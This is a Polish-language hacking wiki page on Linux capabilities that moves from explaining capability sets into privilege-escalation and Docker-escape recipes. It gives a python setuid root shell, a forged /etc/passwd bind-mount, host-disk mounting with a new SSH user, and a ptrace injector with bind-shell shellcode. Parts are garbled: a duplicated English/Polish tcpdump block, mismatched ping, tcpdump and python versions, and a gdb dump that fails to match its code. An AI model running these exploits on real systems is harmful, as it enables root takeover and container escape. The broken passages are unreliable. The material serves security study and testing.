# Linux Capabilities

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów GitHub.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając na celu promowanie wiedzy technicznej, ten kongres stanowi wrzące miejsce spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities dzielą **uprawnienia roota na mniejsze, odrębne jednostki**, pozwalając procesom na posiadanie podzbioru uprawnień. Dzięki temu minimalizuje się ryzyko, nie przyznając niepotrzebnie pełnych uprawnień roota.

### Problem:
- Zwykli użytkownicy mają ograniczone uprawnienia, co wpływa na zadania takie jak otwieranie gniazd sieciowych, które wymagają dostępu roota.

### Zbiory uprawnień:

1. **Dziedziczone (CapInh)**:
- **Cel**: Określa uprawnienia przekazywane przez proces nadrzędny.
- **Funkcjonalność**: Gdy tworzony jest nowy proces, dziedziczy on uprawnienia z tego zbioru po swoim rodzicu. Przydatne do utrzymania określonych uprawnień w procesach potomnych.
- **Ograniczenia**: Proces nie może uzyskać uprawnień, których jego rodzic nie posiadał.

2. **Efektywne (CapEff)**:
- **Cel**: Reprezentuje aktualnie wykorzystywane przez proces uprawnienia.
- **Funkcjonalność**: Jest to zbiór uprawnień, których jądro sprawdza, aby udzielić zgody na różne operacje. Dla plików, ten zbiór może być flagą wskazującą, czy uprawnienia dozwolone pliku mają być uważane za efektywne.
- **Znaczenie**: Zbiór efektywny jest kluczowy dla natychmiastowych sprawdzeń uprawnień, działając jako aktywny zbiór uprawnień, który może być używany przez proces.

3. **Dozwolone (CapPrm)**:
- **Cel**: Określa maksymalny zbiór uprawnień, jakie proces może posiadać.
- **Funkcjonalność**: Proces może podnieść uprawnienie ze zbioru dozwolonego do zbioru efektywnego, dając mu możliwość korzystania z tego uprawnienia. Może również odrzucić uprawnienia ze zbioru dozwolonego.
- **Granica**: Działa jako górne ograniczenie dla uprawnień, jakie proces może mieć, zapewniając, że proces nie przekracza określonego zakresu uprawnień.

4. **Ograniczające (CapBnd)**:
- **Cel**: Ustala górną granicę uprawnień, jakie proces może zdobyć w trakcie swojego cyklu życia.
- **Funkcjonalność**: Nawet jeśli proces ma określone uprawnienie w swoim zbiorze dziedzicznym lub dozwolonym, nie może zdobyć tego uprawnienia, chyba że jest również w zbiorze ograniczającym.
- **Przykład użycia**: Ten zbiór jest szczególnie przydatny do ograniczania potencjału eskalacji uprawnień procesu, dodając dodatkową warstwę zabezpieczeń.

5. **Środowiskowe (CapAmb)**:
- **Cel**: Pozwala na utrzymanie określonych uprawnień podczas wywołania systemowego `execve`, które zwykle powoduje pełne zresetowanie uprawnień procesu.
- **Funkcjonalność**: Zapewnia, że programy nie-SUID, które nie mają powiązanych uprawnień plików, mogą zachować określone uprawnienia.
- **Ograniczenia**: Uprawnienia w tym zbiorze podlegają ograniczeniom zbiorów dziedzicznego i dozwolonego, zapewniając, że nie przekraczają one dozwolonych uprawnień procesu.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Aby uzyskać dalsze informacje, sprawdź:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Uprawnienia procesów i plików binarnych

### Uprawnienia procesów

Aby zobaczyć uprawnienia dla danego procesu, użyj pliku **status** w katalogu /proc. Ponieważ dostarcza on więcej szczegółów, ograniczmy go tylko do informacji dotyczących uprawnień systemu Linux.\
Zauważ, że dla wszystkich działających procesów informacje o uprawnieniach są przechowywane na poziomie wątku, a dla plików binarnych w systemie plików są one przechowywane w rozszerzonych atrybutach.

Możesz znaleźć zdefiniowane uprawnienia w pliku /usr/include/linux/capability.h

Możesz znaleźć uprawnienia bieżącego procesu w `cat /proc/self/status` lub wykonując `capsh --print`, a uprawnienia innych użytkowników w `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ten polecenie powinno zwrócić 5 linii na większości systemów.

* CapInh = Dziedziczone uprawnienia
* CapPrm = Dozwolone uprawnienia
* CapEff = Efektywne uprawnienia
* CapBnd = Zestaw graniczny
* CapAmb = Zestaw uprawnień środowiskowych
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Te liczby szesnastkowe nie mają sensu. Za pomocą narzędzia capsh możemy je odkodować na nazwę uprawnień.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sprawdźmy teraz **uprawnienia** używane przez `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Chociaż to działa, istnieje inny i prostszy sposób. Aby zobaczyć uprawnienia działającego procesu, wystarczy użyć narzędzia **getpcaps** po którym podajemy jego identyfikator procesu (PID). Można również podać listę identyfikatorów procesów.
```bash
getpcaps 1234
```
Sprawdźmy tutaj uprawnienia `tcpdump` po nadaniu wystarczających uprawnień binarnemu (`cap_net_admin` i `cap_net_raw`) do podsłuchiwania sieci (_tcpdump działa w procesie 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Jak widać, podane uprawnienia odpowiadają wynikom dwóch sposobów uzyskiwania uprawnień dla pliku binarnego.\
Narzędzie _getpcaps_ korzysta z wywołania systemowego **capget()**, aby zapytać o dostępne uprawnienia dla określonego wątku. Wywołanie systemowe to wymaga tylko podania identyfikatora PID, aby uzyskać więcej informacji.

### Uprawnienia plików binarnych

Pliki binarne mogą mieć uprawnienia, które mogą być używane podczas wykonywania. Na przykład, bardzo często można znaleźć plik binarny `ping` z uprawnieniem `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Możesz **wyszukiwać binarne z uprawnieniami** za pomocą:
```bash
getcap -r / 2>/dev/null
```
### Zrzucanie uprawnień za pomocą capsh

Jeśli zrzucimy uprawnienia CAP\_NET\_RAW dla _ping_, to narzędzie ping przestanie działać.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oprócz samego wyniku _capsh_, również samo polecenie _tcpdump_ powinno wywołać błąd.

> /bin/bash: /usr/sbin/tcpdump: Operacja niedozwolona

Błąd jednoznacznie pokazuje, że polecenie ping nie ma uprawnień do otwarcia gniazda ICMP. Teraz wiemy na pewno, że to działa zgodnie z oczekiwaniami.

### Usuwanie uprawnień

Możesz usunąć uprawnienia binarnego pliku za pomocą
```bash
setcap -r </path/to/binary>
```
## Uprawnienia użytkownika

Wygląda na to, że **można przypisać uprawnienia również do użytkowników**. Oznacza to prawdopodobnie, że każdy proces uruchomiony przez użytkownika będzie mógł korzystać z jego uprawnień.\
Na podstawie [tego](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [tego](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [tego](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) kilka plików musi zostać skonfigurowanych, aby nadać użytkownikowi określone uprawnienia, ale plik odpowiedzialny za przypisanie uprawnień do każdego użytkownika to `/etc/security/capability.conf`.\
Przykład pliku:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Zdolności środowiskowe

Kompilując poniższy program, można **uruchomić powłokę bash w środowisku, które udostępnia zdolności**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Wewnątrz **bash uruchomionego przez skompilowany plik binarny środowiskowy** można zauważyć **nowe uprawnienia** (zwykły użytkownik nie będzie miał żadnych uprawnień w sekcji "aktualnej").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Możesz **dodać tylko uprawnienia, które są obecne** zarówno w zestawie dozwolonych, jak i dziedzicznych.
{% endhint %}

### Binarki świadome uprawnień / Binarki nieświadome uprawnień

**Binarki świadome uprawnień nie będą korzystać z nowych uprawnień** przekazanych przez środowisko, natomiast **binarki nieświadome uprawnień będą z nich korzystać**, ponieważ nie odrzucą ich. Oznacza to, że binarki nieświadome uprawnień są podatne w specjalnym środowisku, które przyznaje uprawnienia binarnym.

## Uprawnienia usługi

Domyślnie **usługa uruchomiona jako root będzie miała przypisane wszystkie uprawnienia**, a w niektórych przypadkach może to być niebezpieczne.\
Dlatego plik konfiguracyjny **usługi pozwala na określenie** uprawnień, które chcesz, aby miała, **oraz** użytkownika, który powinien wykonywać usługę, aby uniknąć uruchamiania usługi z niepotrzebnymi uprawnieniami:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Uprawnienia w kontenerach Docker

Domyślnie Docker przypisuje kilka uprawnień do kontenerów. Bardzo łatwo sprawdzić, jakie są te uprawnienia, wykonując polecenie:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając na celu promowanie wiedzy technicznej, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## Eskalacja uprawnień/Ucieczka z kontenera

Można wykorzystać zdolności, gdy **chcesz ograniczyć własne procesy po wykonaniu uprzywilejowanych operacji** (np. po skonfigurowaniu chroot i powiązaniu z gniazdem). Jednak mogą być one wykorzystane przez przekazywanie im złośliwych poleceń lub argumentów, które są następnie uruchamiane jako root.

Możesz wymusić zdolności na programach za pomocą `setcap` i sprawdzić je za pomocą `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` oznacza, że dodajesz zdolność ("-" usuwa ją) jako Efektywną i Dozwoloną.

Aby zidentyfikować programy w systemie lub folderze posiadające zdolności:
```bash
getcap -r / 2>/dev/null
```
### Przykład wykorzystania

W poniższym przykładzie stwierdzono, że binarny plik `/usr/bin/python2.6` jest podatny na eskalację uprawnień:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Zdolności** potrzebne przez `tcpdump`, aby **umożliwić dowolnemu użytkownikowi podsłuchiwanie pakietów**:

```markdown
To allow any user to sniff packets using `tcpdump`, the following capabilities need to be set:

1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.

To set these capabilities, you can use the `setcap` command:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After setting the capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```
```

**Zdolności** potrzebne przez `tcpdump`, aby **umożliwić dowolnemu użytkownikowi podsłuchiwanie pakietów**:

```markdown
Aby umożliwić dowolnemu użytkownikowi podsłuchiwanie pakietów za pomocą `tcpdump`, należy ustawić następujące zdolności:

1. `CAP_NET_RAW`: Ta zdolność umożliwia użytkownikowi tworzenie gniazd surowych, co jest niezbędne do podsłuchiwania pakietów.

Aby ustawić te zdolności, można użyć polecenia `setcap`:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

Po ustawieniu zdolności, dowolny użytkownik będzie mógł uruchomić `tcpdump` i podsłuchiwać pakiety bez konieczności posiadania uprawnień roota.
```
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Specjalny przypadek "pustych" uprawnień

[Z dokumentacji](https://man7.org/linux/man-pages/man7/capabilities.7.html): Należy zauważyć, że można przypisać puste zbiory uprawnień do pliku programu, co oznacza, że można utworzyć program z ustawionym identyfikatorem użytkownika root, który zmienia efektywny i zapisany identyfikator użytkownika do 0, ale nie nadaje żadnych uprawnień temu procesowi. Innymi słowy, jeśli masz plik binarny, który:

1. nie jest własnością roota,
2. nie ma ustawionych bitów `SUID`/`SGID`,
3. ma pusty zbiór uprawnień (np. `getcap myelf` zwraca `myelf =ep`),

to **ten plik binarny zostanie uruchomiony jako root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** to bardzo potężne uprawnienie w systemie Linux, często porównywane do poziomu roota ze względu na swoje rozległe **uprawnienia administracyjne**, takie jak montowanie urządzeń czy manipulowanie funkcjami jądra. Chociaż jest niezbędne dla kontenerów symulujących całe systemy, **`CAP_SYS_ADMIN` stanowi znaczne wyzwanie dla bezpieczeństwa**, zwłaszcza w środowiskach konteneryzowanych, ze względu na możliwość eskalacji uprawnień i kompromitacji systemu. Dlatego jego użycie wymaga rygorystycznej oceny bezpieczeństwa i ostrożnego zarządzania, z silnym naciskiem na odrzucenie tego uprawnienia w kontenerach specyficznych dla aplikacji, aby przestrzegać **zasady najmniejszych uprawnień** i zminimalizować powierzchnię ataku.

**Przykład z plikiem binarnym**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Za pomocą pythona można zamontować zmodyfikowany plik _passwd_ na oryginalnym pliku _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I na koniec **zamontuj** zmodyfikowany plik `passwd` w lokalizacji `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I będziesz w stanie **`su` jako root** używając hasła "password".

**Przykład z środowiskiem (Docker breakout)**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera Docker za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku można zobaczyć, że możliwość SYS_ADMIN jest włączona.

* **Montowanie**

To pozwala kontenerowi Docker na **montowanie dysku hosta i swobodny dostęp do niego**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Pełny dostęp**

W poprzedniej metodzie udało nam się uzyskać dostęp do dysku hosta Docker.\
Jeśli zauważysz, że host uruchamia serwer **ssh**, możesz **utworzyć użytkownika wewnątrz dysku hosta Docker** i uzyskać do niego dostęp za pomocą SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**To oznacza, że możesz uciec z kontenera, wstrzykując shellcode do pewnego procesu działającego wewnątrz hosta.** Aby uzyskać dostęp do procesów działających wewnątrz hosta, kontener musi być uruchomiony przynajmniej z opcją **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia korzystanie z funkcji debugowania i śledzenia wywołań systemowych dostarczanych przez `ptrace(2)` oraz wywołań dołączania pamięci międzyprocesowej, takich jak `process_vm_readv(2)` i `process_vm_writev(2)`. Chociaż jest to potężne narzędzie do celów diagnostycznych i monitorowania, jeśli `CAP_SYS_PTRACE` jest włączone bez restrykcyjnych środków, takich jak filtr seccomp dla `ptrace(2)`, może to znacznie osłabić bezpieczeństwo systemu. W szczególności, może być wykorzystane do obejścia innych ograniczeń bezpieczeństwa, zwłaszcza tych narzuconych przez seccomp, jak pokazują [dowody koncepcyjne (PoC) takie jak ten](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Przykład z użyciem pliku binarnego (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Przykład z użyciem binarnego pliku (gdb)**

`gdb` z uprawnieniami `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Utwórz shellcode za pomocą narzędzia msfvenom do wstrzykiwania go w pamięć za pomocą gdb.

```bash
$ msfvenom -p linux/x86/exec CMD=/bin/sh -f c -o shellcode.c
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
    printf("Shellcode Length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
```

```bash
$ gcc -o shellcode shellcode.c -z execstack
$ gdb -q ./shellcode
(gdb) disas main
Dump of assembler code for function main:
   0x08048414 <+0>:     push   %ebp
   0x08048415 <+1>:     mov    %esp,%ebp
   0x08048417 <+3>:     sub    $0x8,%esp
   0x0804841a <+6>:     and    $0xfffffff0,%esp
   0x0804841d <+9>:     mov    $0x0,%eax
   0x08048422 <+14>:    add    $0xf,%eax
   0x08048425 <+17>:    add    $0xf,%eax
   0x08048428 <+20>:    shr    $0x4,%eax
   0x0804842b <+23>:    shl    $0x4,%eax
   0x0804842e <+26>:    sub    %eax,%esp
   0x08048430 <+28>:    movl   $0x80484f0,(%esp)
   0x08048437 <+35>:    call   0x8048300 <printf@plt>
   0x0804843c <+40>:    lea    0x80484f0,%eax
   0x08048441 <+45>:    mov    %eax,(%esp)
   0x08048444 <+48>:    call   0x8048320 <strlen@plt>
   0x08048449 <+53>:    mov    %eax,%edx
   0x0804844b <+55>:    lea    0x80484f0,%eax
   0x08048450 <+60>:    mov    %eax,(%esp)
   0x08048453 <+63>:    call   0x8048310 <__printf_chk@plt>
   0x08048458 <+68>:    lea    0x80484f0,%eax
   0x0804845d <+73>:    mov    %eax,(%esp)
   0x08048460 <+76>:    call   0x8048330 <__libc_start_main@plt>
   0x08048465 <+81>:    leave
   0x08048466 <+82>:    ret
End of assembler dump.
(gdb) b *main+82
Breakpoint 1 at 0x8048466
(gdb) r
Starting program: /root/shellcode
Shellcode Length: 23

Breakpoint 1, 0x08048466 in main ()
(gdb) x/23xb $eax
